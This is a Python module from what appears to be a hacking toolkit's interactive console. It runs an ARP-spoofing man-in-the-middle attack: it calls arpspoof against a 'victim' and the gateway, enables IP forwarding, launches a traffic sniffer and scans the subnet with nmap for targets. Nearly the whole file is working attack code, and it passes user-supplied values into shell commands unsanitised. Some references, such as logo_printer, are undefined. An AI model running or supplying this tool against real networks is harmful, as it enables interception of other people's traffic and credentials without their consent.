from re import findall
from libs.colors import COLORS
from subprocess import check_output, CalledProcessError, call
from os import devnull
from terminaltables import AsciiTable
from socket import AF_INET, SOCK_DGRAM, socket


devnull = open(devnull, 'w')
colors = COLORS()

global program_path
global activated_option


def print_options(inputs_dict):

    descriptions = {
        'IFACE': 'This is the inter face of network connection',
        'GATEWAY': 'This is the IP address of the router',
        'VICTIM' : 'This is the IP address of the victim'
    }

    print(colors.RESET, end='')
    table_data = [[f'{colors.BOLD}Option', f'{colors.BOLD}Current Setting', f'{colors.BOLD}Description{colors.RESET}']]
    for item in inputs_dict:
        try:
            single_data = [str(item), str(inputs_dict[item]), descriptions[item]]
            table_data.append(single_data)
        except KeyError:
            pass

    table = AsciiTable(table_data)
    print(table.table, end='\n\n')

def update_setting(setting, new_value, save_values):
    save_values[setting] = new_value
    return save_values

def show_interfaces():
    interfaces = check_output("ifconfig", shell=True, stderr=devnull, stdin=devnull)
    if interfaces == b'':
        print(colors.Red + '[✘]You have no wifi interface connected!' + colors.RESET)
    else:
        names = findall("(.*)(?:\s*flags.*)", interfaces.decode('utf-8'))
        for index, name in enumerate(names):
            name = name.split(':')
            print(f'\t{index + 1} --> {name[0]}')

def spoof(settings):
    command = 'arpspoof -i {} -t {} {}; exit;'.format(settings['IFACE'], settings['GATEWAY'], settings['VICTIM'])
    call("gnome-terminal -x bash -c '{} exec bash'".format(command), shell=True, stderr=devnull, stdin=devnull, stdout=devnull)
    print(colors.Green + '[✔]Spoofing the gateway' + colors.RESET)

    command = 'arpspoof -i {} -t {} {}; exit;'.format(settings['IFACE'], settings['VICTIM'], settings['GATEWAY'])
    call("gnome-terminal -x bash -c '{} exec bash'".format(command), shell=True, stderr=devnull, stdin=devnull, stdout=devnull)
    print(colors.Green + '[✔]Spoofing the victims' + colors.RESET)

    call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True, stderr=devnull, stdin=devnull, stdout=devnull)
    print(colors.Green + '[✔]Serving the internet' + colors.RESET)

def sniff(settings):
    command = 'python2 {}/libs/spoofing/arp_sniff.py {} {};exit;'.format(program_path, settings['IFACE'], program_path)
    call("gnome-terminal -x bash -c '{} exec bash'".format(command), shell=True, stderr=devnull, stdin=devnull, stdout=devnull)
    print(colors.Green + '[✔]Sniffer activated' + colors.RESET)

def main_program(program_path):

    s = socket(AF_INET, SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    private_ip = s.getsockname()[0]
    s.close()
    gateway_list = str(private_ip).split('.')
    gateway_list[3] = '1'
    gateway = ''
    for bulk in gateway_list:
        gateway += bulk + '.'

    saved_inputs_dict = {
        'IFACE': 'eth0',
        'GATEWAY': gateway[:-1],
        'VICTIM': '192.168.1.2'
    }

    # from here it will do the command and request thing
    global activated_option
    while True:
        # get the command from the user
        command = input("".join(activated_option) + ' > ')

        # if the command is show options then show options
        if command == 'show options' or command == 'options':
            print_options(saved_inputs_dict)

        elif command == 'show ifaces' or command == 'iface' or command == 'ifaces':
            show_interfaces() 

        elif command == 'spoof':
            spoof(saved_inputs_dict)

        elif command == 'sniff':
            spoof(saved_inputs_dict)
            sniff(saved_inputs_dict)

        elif command == 'show victims' or command == 'victims':
            command = 'nmap -T4 -F {}/24;python3 {}/libs/wpa2/waiting.py;exit;'.format(saved_inputs_dict['GATEWAY'], program_path)
            call("gnome-terminal -x bash -c '{} exec bash'".format(command), shell=True, stderr=devnull, stdin=devnull, stdout=devnull)
            print(colors.Green + '[✔]Netdiscover prompted scan may take some time' + colors.RESET)
                
        # if clear clear the screen
        elif command == 'clear':
            call('clear', shell=True)

        # if the command is help print help
        elif command == 'help':
            logo_printer.print_help()

        # if the command id exit then break the loop
        elif command == 'exit' or command == 'quit':
            activated_option.remove(' {}spoof({}ARP{}{}){}'.format(colors.BOLD, colors.Red, colors.RESET, colors.BOLD, colors.RESET))
            break

        elif command == '' or command == ' ':
            pass

        # if the command is set then update the settings wales
        elif command.split()[0] == 'set':
            try:
                setting = command.split()[1]
                new_value = command.split()[2]
                saved_inputs_dict = update_setting(setting, new_value, saved_inputs_dict)
            except Exception as error:
                print(colors.Red + '[✘]Error: {}'.format(error) + colors.RESET)

        # if the command is non of above it is a unreconised command
        else:
            print(colors.Red + '[✘]Invalid command' + colors.RESET)


main_program(program_path)